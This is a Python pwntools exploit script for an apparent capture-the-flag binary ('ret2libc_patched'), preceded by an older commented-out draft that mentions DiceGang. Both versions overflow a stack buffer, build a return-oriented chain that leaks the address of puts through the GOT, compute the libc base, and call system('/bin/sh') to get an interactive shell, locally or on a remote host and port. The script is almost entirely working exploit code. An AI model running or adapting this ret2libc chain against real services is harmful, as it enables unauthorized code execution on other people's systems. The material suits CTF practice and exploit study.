'''
exe = ELF(EXE)
pop_rdi = 0x401313 # pop rdi; ret;
offset  = libc.symbols['puts'] # Offset to puts()
r.recvuntil(b'DiceGang?\n') 
payload  = b'A'*34 # padding
payload += p64(pop_rdi) # pop rdi; ret;
payload += p64(exe.got['puts']) # puts@got
payload += p64(exe.plt['puts']) # puts@plt
payload += p64(exe.symbols['main']) # main
r.sendline(payload) # Send payload
r.recvline()
r.recvline()
leak = u64(r.recvline().strip().ljust(8, b'\x00')) # Leak puts() address
log.info(f"Leak: {hex(leak)}") # Print leak
libc.address = leak - offset # Calculate libc base address
binsh        = next(libc.search(b'/bin/sh')) # Find /bin/sh address
system       = libc.symbols['system'] # Find system() address
payload  = b'A'*34 # padding
payload += p64(pop_rdi) # pop rdi; ret;
payload += p64(binsh) # /bin/sh
payload += p64(0x401314) # ret
payload += p64(system) # system()
r.sendline(payload) # Send payload
'''
from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './ret2libc_patched'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc.so.6')
rop = ROP(elf)
# This will automatically get context arch, bits, os etc

# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
r = start()
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
offset = libc.symbols['puts']
payload = b'a' * 40
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
r.sendlineafter(b'name', payload)
print(r.recvline())
print(r.recvline())
leak = u64(r.recvline().strip().ljust(8, b'\x00'))
log.info(f"Leak: {hex(leak)}")
print(r.recvline())
libc.address = leak - offset
binsh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
payload = b'a' * 40
payload += p64(0x0000000000401244)

payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
r.sendline(payload)
r.interactive()